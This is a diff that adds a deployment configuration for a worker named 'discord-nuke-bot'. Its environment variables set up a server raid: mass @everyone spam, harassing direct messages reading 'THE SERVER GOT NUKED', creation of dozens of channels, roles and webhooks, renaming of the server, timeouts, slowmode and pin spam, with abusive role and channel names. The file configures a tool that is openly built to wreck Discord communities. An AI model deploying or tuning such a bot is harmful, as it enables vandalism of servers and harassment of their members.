@@ -1,0 +1,73 @@
+services:
+  - type: worker
+    name: discord-nuke-bot
+    env: python
+    runtime: python
+    buildCommand: pip install -r requirements.txt
+    startCommand: python bot.py
+    plan: free
+    envVars:
+      - key: DISCORD_TOKEN
+        sync: false
+      - key: BOT_PREFIX
+        value: "-"
+      - key: WHITELIST
+        value: ""
+      - key: SPAM_MESSAGE
+        value: "@everyone"
+      - key: SPAM_COUNT
+        value: "25"
+      - key: TEXT_TO_SPEECH
+        value: "False"
+      - key: DM_MESSAGE
+        value: "THE SERVER GOT NUKED"
+      - key: CHANNEL_NAME
+        value: "nuked"
+      - key: CHANNELS_COUNT
+        value: "10"
+      - key: NEW_CHANNEL_NAME
+        value: "nuked"
+      - key: VOICE_CHANNELS_COUNT
+        value: "10"
+      - key: VOICE_CHANNEL_NAME
+        value: "NUKED"
+      - key: CATEGORY_NAME
+        value: "NUKED"
+      - key: CATEGORIES_COUNT
+        value: "5"
+      - key: THREAD_COUNT
+        value: "5"
+      - key: THREAD_NAME
+        value: "nuked"
+      - key: NSFW_CHANNEL_NAME
+        value: "nuked"
+      - key: SLOWMODE_DURATION
+        value: "300"
+      - key: ROLE_NAME
+        value: "nuked"
+      - key: ROLES_COUNT
+        value: "50"
+      - key: NEW_ROLE_NAME
+        value: "nuked"
+      - key: ADMIN_ROLE_NAME
+        value: "Fucked"
+      - key: SERVER_NAME
+        value: "NUKED SERVER"
+      - key: SERVER_ICON_URL
+        value: "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg"
+      - key: NICKNAME
+        value: "NUKED"
+      - key: TIMEOUT_DURATION
+        value: "28"
+      - key: WEBHOOK_NAME
+        value: "NUKED"
+      - key: WEBHOOK_COUNT
+        value: "10"
+      - key: WEBHOOK_RENAME
+        value: "NUKED"
+      - key: INVITE_COUNT
+        value: "10"
+      - key: PIN_SPAM_COUNT
+        value: "5"
+      - key: MOVE_VOICE_CHANNEL_NAME
+        value: "Fucking LOSERS"
